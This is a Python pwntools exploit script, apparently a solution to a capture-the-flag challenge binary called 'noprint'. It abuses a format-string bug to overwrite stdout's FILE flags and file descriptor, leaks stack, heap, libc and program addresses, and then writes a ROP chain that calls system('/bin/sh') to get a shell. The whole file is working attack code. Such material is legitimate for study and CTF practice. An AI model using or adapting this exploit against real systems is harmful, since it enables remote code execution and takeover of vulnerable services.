from re import I
from elftools.construct import lib
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./noprint"
libc_path = "/root/glibc-all-in-one/libs/2.41-6ubuntu1_amd64/libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


new_flags = 0x3e84

# change flag ---> 0x3e84
ddebug("b __vfprintf_internal\n")
payload = f"%{new_flags}c%9$hn".encode()
io.sendlineafter("void\n", payload)
time.sleep(0.5)

# write fileno address to %13$ 9$的值+112->113$
io.sendline(b"%*9$d%112c%13$n")
time.sleep(0.5)
# _fileno-->1
io.sendline(b"%1c%21$hhn")

payload = b"\n\n"
io.sendline(payload)
io.clean()

# leak libc stack heap
time.sleep(0.5)
payload = "%9$p%11$p%12$p%16$p\n\n"
io.sendline(payload.encode())
io.recvuntil(b"\x30\x78", drop=True)
leaks = io.recvuntil(b"\x0a"*2)


log.hexdump(leaks)
heap = int(leaks[0:12], 16)
stack = int(leaks[12:26], 16)
log.success("stack:-----> " + hex(stack))
libc.address = int(leaks[26:40], 16) - 0x2a338
log.success("libc:-----> " + hex(libc.address))
noprint = int(leaks[40:54], 16) - 0x12e4
log.success("pro:-----> " + hex(noprint))

# 
buffer_ptr = stack-0xa6 & 0xffff
payload = f"%{buffer_ptr}c%11$hn\n\n"
io.sendline(payload.encode())

#new_flags = 0x3c84
payload = b"%15492c%9$hn\n"
io.sendline(payload)

io.clean()
io.clean()
io.clean()
sleep(1)

payload2 = f"%3c%21$n"
io.sendline(payload2.encode())

io.clean()
sleep(1)

io.sendline(f"%{stack>>16}c%31$n".encode())

io.clean()
sleep(1)

buffer_ptr = stack-0xa8 & 0xffff
payload = f"%{buffer_ptr}c%11$hn\n\n"
io.sendline(payload.encode())
io.clean()
sleep(1)

io.sendline(f"%{(stack-0xd8)&0xffff}c%31$hn".encode())

sleep(1)

binsh = next(libc.search(b"/bin/sh"))
pop_rdi = 0x11a79c + libc.address
rop_chain = [pop_rdi+1, pop_rdi, binsh, libc.sym['system']]
rop_chain = b''.join(map(p64, rop_chain))
io.sendline(rop_chain)

sleep(1)

#io.sendline("cat flag".encode())

io.interactive()

